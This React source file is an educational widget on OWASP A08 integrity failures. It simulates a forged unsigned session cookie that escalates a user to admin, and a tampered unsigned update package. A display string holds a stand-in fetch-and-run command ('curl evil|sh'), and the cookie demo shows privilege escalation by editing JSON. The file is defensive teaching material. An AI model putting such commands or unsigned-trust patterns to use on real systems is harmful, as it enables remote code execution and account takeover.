import { useMemo, useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';

// OWASP A08 — Software & Data Integrity Failures.
//
// Two side-by-side failure patterns, switchable via tabs. Everything is a
// pure, in-component function — no real network, no real crypto, no real
// archives. The "HMAC" and "Sigstore signature" are deterministic toy
// hashes that exist only to make the lesson visible:
//
//   1) Insecure deserialization — a "session cookie" is base64(JSON). If the
//      server does not bind the payload to a signature, an attacker can
//      flip {"role":"admin"} and the server will trust it.
//
//   2) Unsigned update package — a release pipeline ships a tarball. If
//      the installer does not verify a signature against a known public
//      key, a tampered tarball runs whatever the attacker shipped.
//
// Defensive / educational only. The "attacker payloads" here are inert
// strings displayed in a sandboxed UI.

// --- Tiny deterministic hash (FNV-1a 32) ---------------------------------
// Used to stand in for an HMAC and for a "Sigstore" signature. Not crypto.
function fnv1a(str) {
  let h = 0x811c9dc5;
  for (let i = 0; i < str.length; i++) {
    h ^= str.charCodeAt(i);
    h = (h * 0x01000193) >>> 0;
  }
  return h.toString(16).padStart(8, '0');
}

const SERVER_SECRET = 'srv-secret-2026';
function hmacish(payload) {
  // Toy HMAC: hash(secret || payload). Real HMAC uses inner+outer pads.
  return fnv1a(SERVER_SECRET + '|' + payload);
}

// Base64 helpers that tolerate edits (whitespace etc.)
function b64encode(s) {
  try { return btoa(unescape(encodeURIComponent(s))); }
  catch { return ''; }
}
function b64decode(s) {
  try { return decodeURIComponent(escape(atob(s.replace(/\s+/g, '')))); }
  catch { return null; }
}

// --- Scenario 1: insecure deserialization --------------------------------

const ORIGINAL_SESSION = {
  user: 'alice',
  role: 'customer',
  iat: 1748300000,
};
const TAMPERED_SESSION = {
  user: 'alice',
  role: 'admin',
  iat: 1748300000,
};

function makeCookie(obj, signed) {
  const payload = JSON.stringify(obj);
  const b64 = b64encode(payload);
  if (!signed) return b64;
  // Format: base64(payload).sig
  return b64 + '.' + hmacish(payload);
}

function verifyCookie(cookie, requireSig) {
  // Returns { ok, status, reason, payload }
  if (typeof cookie !== 'string' || !cookie.length) {
    return { ok: false, status: 400, reason: 'empty cookie', payload: null };
  }
  if (requireSig) {
    const dot = cookie.lastIndexOf('.');
    if (dot < 0) {
      return { ok: false, status: 401, reason: 'signature missing', payload: null };
    }
    const b64 = cookie.slice(0, dot);
    const sig = cookie.slice(dot + 1);
    const json = b64decode(b64);
    if (json === null) {
      return { ok: false, status: 400, reason: 'malformed base64', payload: null };
    }
    const expected = hmacish(json);
    if (expected !== sig) {
      return { ok: false, status: 401, reason: 'signature mismatch', payload: null };
    }
    try { return { ok: true, status: 200, reason: 'verified', payload: JSON.parse(json) }; }
    catch { return { ok: false, status: 400, reason: 'invalid JSON', payload: null }; }
  }
  // Unsigned: server trusts whatever is in there.
  const json = b64decode(cookie.split('.')[0]);
  if (json === null) return { ok: false, status: 400, reason: 'malformed base64', payload: null };
  try { return { ok: true, status: 200, reason: 'trusted (unverified)', payload: JSON.parse(json) }; }
  catch { return { ok: false, status: 400, reason: 'invalid JSON', payload: null }; }
}

function DeserializationPanel() {
  const [signed, setSigned] = useState(false);
  const [jsonText, setJsonText] = useState(JSON.stringify(TAMPERED_SESSION, null, 2));

  // The "wire" cookie is built from the learner's edited JSON.
  // When `signed` is ON, we deliberately use the ORIGINAL payload's
  // signature so any edit invalidates the signature — exactly what a
  // real attacker would face when they have no access to the secret.
  const goodSig = useMemo(() => hmacish(JSON.stringify(ORIGINAL_SESSION)), []);

  const parsed = useMemo(() => {
    try { return { ok: true, obj: JSON.parse(jsonText) }; }
    catch (e) { return { ok: false, err: e.message }; }
  }, [jsonText]);

  const wireCookie = useMemo(() => {
    if (!parsed.ok) return '';
    const b64 = b64encode(JSON.stringify(parsed.obj));
    return signed ? b64 + '.' + goodSig : b64;
  }, [parsed, signed, goodSig]);

  const verdict = useMemo(() => {
    if (!parsed.ok) {
      return { ok: false, status: 400, reason: 'client JSON parse error', payload: null };
    }
    return verifyCookie(wireCookie, signed);
  }, [parsed, wireCookie, signed]);

  const isTamperedFromOriginal = useMemo(() => {
    if (!parsed.ok) return false;
    return JSON.stringify(parsed.obj) !== JSON.stringify(ORIGINAL_SESSION);
  }, [parsed]);

  const escalated = verdict.ok && verdict.payload && verdict.payload.role === 'admin';

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
      <div className="controls" style={{ flexWrap: 'wrap', gap: '1rem' }}>
        <label style={toggleLabel}>
          <input type="checkbox" checked={signed} onChange={(e) => setSigned(e.target.checked)} />
          <span>Verify HMAC signature</span>
        </label>
        <button className="btn btn-ghost" onClick={() => setJsonText(JSON.stringify(ORIGINAL_SESSION, null, 2))}>
          Reset to original
        </button>
        <button className="btn btn-ghost" onClick={() => setJsonText(JSON.stringify(TAMPERED_SESSION, null, 2))}>
          Load tampered
        </button>
      </div>

      <div
        className="widget-stage"
        style={{
          display: 'grid',
          gridTemplateColumns: 'minmax(220px, 1fr) minmax(220px, 1fr)',
          gap: '0.8rem',
          alignItems: 'start',
        }}
      >
        <div>
          <div style={panelHead}>Attacker edits the cookie payload</div>
          <textarea
            className="field"
            value={jsonText}
            onChange={(e) => setJsonText(e.target.value)}
            spellCheck={false}
            rows={8}
            style={{
              width: '100%',
              fontFamily: 'var(--font-mono)',
              fontSize: '0.82rem',
              resize: 'vertical',
            }}
          />
          {!parsed.ok && (
            <div style={{ marginTop: '0.3rem', color: 'var(--accent)', fontFamily: 'var(--font-mono)', fontSize: '0.78rem' }}>
              JSON error: {parsed.err}
            </div>
          )}
          <div style={{ marginTop: '0.4rem', fontFamily: 'var(--font-mono)', fontSize: '0.78rem', color: 'var(--ink-soft)' }}>
            cookie on the wire:
          </div>
          <div className="code-block" style={{ fontSize: '0.74rem', wordBreak: 'break-all', marginTop: '0.2rem' }}>
            {wireCookie || '<empty>'}
          </div>
        </div>

        <div>
          <div style={panelHead}>Server response</div>
          <AnimatePresence mode="wait">
            <motion.div
              key={`${verdict.status}-${verdict.reason}`}
              initial={{ opacity: 0, y: 4 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -4 }}
              transition={{ duration: 0.18 }}
              style={{
                border: `2px solid ${verdict.ok ? (escalated ? 'var(--accent)' : '#2a8a3e') : '#2a8a3e'}`,
                background: verdict.ok
                  ? (escalated ? '#fde2e2' : '#d9ead3')
                  : '#d9ead3',
                borderRadius: 6,
                padding: '0.6rem 0.7rem',
                fontFamily: 'var(--font-mono)',
                fontSize: '0.85rem',
              }}
            >
              <div style={{ fontWeight: 700, marginBottom: '0.3rem' }}>
                {verdict.ok
                  ? (escalated ? '200: privilege escalated' : '200: ok')
                  : `${verdict.status}: ${verdict.reason}`}
              </div>
              {verdict.payload && (
                <div style={{ color: 'var(--ink-soft)' }}>
                  session = &#123; user: "{verdict.payload.user}", role: "
                  <span style={{ color: escalated ? 'var(--accent)' : 'inherit', fontWeight: escalated ? 700 : 500 }}>
                    {verdict.payload.role}
                  </span>
                  " &#125;
                </div>
              )}
              {!verdict.ok && (
                <div style={{ color: 'var(--ink-soft)' }}>
                  expected sig = {hmacish(parsed.ok ? JSON.stringify(parsed.obj) : '')}
                  <br />
                  received sig = {wireCookie.includes('.') ? wireCookie.split('.').pop() : '<none>'}
                </div>
              )}
            </motion.div>
          </AnimatePresence>

          <div style={{ marginTop: '0.6rem', fontFamily: 'var(--font-mono)', fontSize: '0.78rem', color: 'var(--ink-soft)' }}>
            tampered vs. original: <strong style={{ color: isTamperedFromOriginal ? 'var(--accent)' : '#2a8a3e' }}>
              {isTamperedFromOriginal ? 'yes' : 'no'}
            </strong>
            <br />
            sig check required: <strong>{signed ? 'yes' : 'no'}</strong>
          </div>
        </div>
      </div>

      <div className="callout">
        {!signed && isTamperedFromOriginal && escalated && (
          <span>
            Unsigned session — the server deserialises whatever JSON it
            receives and grants admin because the cookie said so. This is the
            classic "trust the client" failure that A08 calls out.
          </span>
        )}
        {!signed && !isTamperedFromOriginal && (
          <span>
            Without a signature, the server has no way to tell an honest
            cookie from a forged one. Today it happens to match the original
            payload — tomorrow an attacker flips one field and gets in.
          </span>
        )}
        {signed && isTamperedFromOriginal && (
          <span>
            Signature mismatch — the attacker can edit the JSON, but they
            cannot recompute the HMAC without the server's secret, so the
            request is rejected before any deserialised field is trusted.
          </span>
        )}
        {signed && !isTamperedFromOriginal && (
          <span>
            Verified payload. The HMAC binds the bytes to the server's
            secret, so any in-flight edit invalidates the cookie.
          </span>
        )}
      </div>
    </div>
  );
}

// --- Scenario 2: unsigned update package ---------------------------------

const CLEAN_TARBALL = 'app-v1.4.2.tar.gz::install.sh{run app}';
const TAMPERED_TARBALL = 'app-v1.4.2.tar.gz::install.sh{run app; curl evil|sh}';
const PUBLISHED_SIG = fnv1a(CLEAN_TARBALL); // what the release pipeline signed

function installOutcome({ verify, tampered }) {
  const received = tampered ? TAMPERED_TARBALL : CLEAN_TARBALL;
  const receivedHash = fnv1a(received);
  if (verify) {
    if (receivedHash !== PUBLISHED_SIG) {
      return {
        kind: 'abort',
        title: 'install aborted',
        lines: [
          `expected sha = ${PUBLISHED_SIG}`,
          `received sha = ${receivedHash}`,
          'checksum mismatch — refusing to extract',
        ],
      };
    }
    return {
      kind: 'ok',
      title: 'installed (verified)',
      lines: [
        `signature ok (sha = ${PUBLISHED_SIG})`,
        'extracted tarball, ran install.sh',
        'app v1.4.2 is live',
      ],
    };
  }
  // No verification.
  if (tampered) {
    return {
      kind: 'compromised',
      title: 'compromised',
      lines: [
        'no signature check performed',
        'extracted tarball, ran install.sh',
        'attacker code executed with installer privileges',
      ],
    };
  }
  return {
    kind: 'ok',
    title: 'installed (unverified)',
    lines: [
      'no signature check performed',
      'extracted tarball, ran install.sh',
      'app v1.4.2 is live (got lucky this time)',
    ],
  };
}

function UpdatePanel() {
  const [verify, setVerify] = useState(false);
  const [tampered, setTampered] = useState(true);

  const outcome = useMemo(() => installOutcome({ verify, tampered }), [verify, tampered]);
  const received = tampered ? TAMPERED_TARBALL : CLEAN_TARBALL;

  const accent =
    outcome.kind === 'compromised' ? 'var(--accent)' :
    outcome.kind === 'abort'       ? '#1c6dd0' :
    '#2a8a3e';
  const bg =
    outcome.kind === 'compromised' ? '#fde2e2' :
    outcome.kind === 'abort'       ? '#e6efff' :
    '#d9ead3';

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
      <div className="controls" style={{ flexWrap: 'wrap', gap: '1rem' }}>
        <label style={toggleLabel}>
          <input type="checkbox" checked={verify} onChange={(e) => setVerify(e.target.checked)} />
          <span>Require Sigstore signature + verify</span>
        </label>
        <label style={toggleLabel}>
          <input type="checkbox" checked={tampered} onChange={(e) => setTampered(e.target.checked)} />
          <span>Package tampered in transit</span>
        </label>
      </div>

      <div
        className="widget-stage"
        style={{
          display: 'grid',
          gridTemplateColumns: 'minmax(220px, 1fr) minmax(220px, 1fr)',
          gap: '0.8rem',
          alignItems: 'start',
        }}
      >
        <div>
          <div style={panelHead}>Release pipeline → client</div>
          <div className="code-block" style={{ fontSize: '0.78rem' }}>
            # publisher signs
            {'\n'}artifact   = {CLEAN_TARBALL}
            {'\n'}signed sha = {PUBLISHED_SIG}
            {'\n'}
            {'\n'}# bytes received by the client
            {'\n'}artifact   = <span style={{ color: tampered ? 'var(--accent)' : 'inherit' }}>{received}</span>
            {'\n'}sha (now)  = <span style={{ color: tampered ? 'var(--accent)' : 'inherit' }}>{fnv1a(received)}</span>
          </div>
          <div style={{ marginTop: '0.5rem', fontFamily: 'var(--font-mono)', fontSize: '0.78rem', color: 'var(--ink-soft)' }}>
            verify on install: <strong>{verify ? 'yes' : 'no'}</strong>
            <br />
            tampered in transit: <strong style={{ color: tampered ? 'var(--accent)' : 'inherit' }}>
              {tampered ? 'yes' : 'no'}
            </strong>
          </div>
        </div>

        <div>
          <div style={panelHead}>Installer outcome</div>
          <AnimatePresence mode="wait">
            <motion.div
              key={`${outcome.kind}-${verify}-${tampered}`}
              initial={{ opacity: 0, y: 4 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -4 }}
              transition={{ duration: 0.18 }}
              style={{
                border: `2px solid ${accent}`,
                background: bg,
                borderRadius: 6,
                padding: '0.6rem 0.7rem',
                fontFamily: 'var(--font-mono)',
                fontSize: '0.82rem',
              }}
            >
              <div style={{ fontWeight: 700, marginBottom: '0.3rem' }}>{outcome.title}</div>
              {outcome.lines.map((l, i) => (
                <div key={i} style={{ color: 'var(--ink-soft)' }}>{l}</div>
              ))}
            </motion.div>
          </AnimatePresence>
        </div>
      </div>

      <div className="callout">
        {outcome.kind === 'compromised' && (
          <span>
            Unsigned auto-update + a tampered package = the installer just
            ran the attacker's payload with whatever privilege the installer
            had (often root). This is the SolarWinds-shape failure A08 is
            built around.
          </span>
        )}
        {outcome.kind === 'abort' && (
          <span>
            Signature verification noticed the bytes do not match what the
            publisher signed and refused to extract. The tamper attempt is
            visible in logs and never reaches code execution.
          </span>
        )}
        {outcome.kind === 'ok' && verify && (
          <span>
            Clean package, signature matches the publisher's key — the
            normal happy path. The verify step costs almost nothing per
            install and is the only thing that keeps the bad-path bad.
          </span>
        )}
        {outcome.kind === 'ok' && !verify && (
          <span>
            Installs fine today because nothing was tampered with. The
            unsigned-update vulnerability is silent until someone takes the
            CDN or the mirror — at which point every previous "fine"
            install is doing the attacker's work.
          </span>
        )}
      </div>
    </div>
  );
}

// --- Tabs shell ----------------------------------------------------------

const TABS = [
  { key: 'deserialization', name: 'Insecure deserialization' },
  { key: 'update',          name: 'Unsigned update package' },
];

export default function IntegrityFailuresWidget() {
  const [tab, setTab] = useState('deserialization');

  return (
    <div className="widget">
      <div className="widget-title">A08 — Software &amp; Data Integrity Failures</div>

      <div className="controls">
        {TABS.map((t) => (
          <button
            key={t.key}
            className={`btn ${tab === t.key ? 'btn-accent' : ''}`}
            onClick={() => setTab(t.key)}
          >
            {t.name}
          </button>
        ))}
      </div>

      {tab === 'deserialization' ? <DeserializationPanel /> : <UpdatePanel />}
    </div>
  );
}

const toggleLabel = {
  display: 'inline-flex',
  alignItems: 'center',
  gap: '0.4rem',
  fontFamily: 'var(--font-mono)',
  fontSize: '0.85rem',
  cursor: 'pointer',
};

const panelHead = {
  fontFamily: 'var(--font-display)',
  fontSize: '0.9rem',
  marginBottom: '0.4rem',
};
